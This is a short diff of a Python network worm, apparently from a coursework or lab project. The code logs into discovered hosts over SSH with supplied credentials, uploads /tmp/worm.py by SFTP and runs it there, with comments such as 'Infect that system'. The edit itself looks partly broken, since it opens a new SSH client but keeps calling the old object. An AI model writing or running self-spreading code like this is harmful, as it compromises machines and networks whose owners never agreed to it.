@@ -107,6 +107,8 @@ def spreadAndExecute(sshClient):
 
 
 	# kevin
+	ssh = paramiko.SSHClient()
+	ssh.connect(sshClient[1], username=sshClient[2], password=sshClient[3])
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
 	sshClient.exec_command("python3 /tmp/worm.py")
@@ -336,6 +338,6 @@ for host in networkHosts:
 		print("Trying to spread")
 		
 		# Infect that system
-		spreadAndExecute(sshInfo[0])
+		spreadAndExecute(sshInfo)
 		
 		print("Spreading complete")
